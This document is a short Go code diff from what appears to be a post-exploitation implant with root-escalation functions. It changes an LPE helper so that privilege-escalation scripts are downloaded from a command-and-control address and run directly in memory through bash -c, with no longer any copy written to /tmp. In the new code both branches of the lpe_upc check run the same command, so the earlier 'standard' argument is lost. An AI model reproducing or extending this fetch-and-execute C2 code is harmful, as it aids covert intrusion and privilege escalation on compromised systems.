@@ -82,16 +82,17 @@ func GetRootXorg(ctx context.Context, cancel context.CancelFunc) (err error) {
 // lpeHelper runs les and upc to suggest LPE methods
 func lpeHelper(method string) string {
 	log.Printf("Downloading lpe script from %s", CCAddress+method)
-	_, err := DownloadViaCC(CCAddress+method, "/tmp/"+method)
+	var scriptData []byte
+	scriptData, err := DownloadViaCC(CCAddress+method, "")
 	if err != nil {
 		return "LPE error: " + err.Error()
 	}
-	lpe := fmt.Sprintf("/tmp/%s", method)
 
+	// run the script
 	log.Println("Running LPE suggest")
-	cmd := exec.Command("/bin/bash", lpe)
+	cmd := exec.Command("/bin/bash", "-c", string(scriptData))
 	if method == "lpe_upc" {
-		cmd = exec.Command("/bin/bash", lpe, "standard")
+		cmd = exec.Command("/bin/bash", "-c", string(scriptData))
 	}
 
 	outBytes, err := cmd.CombinedOutput()
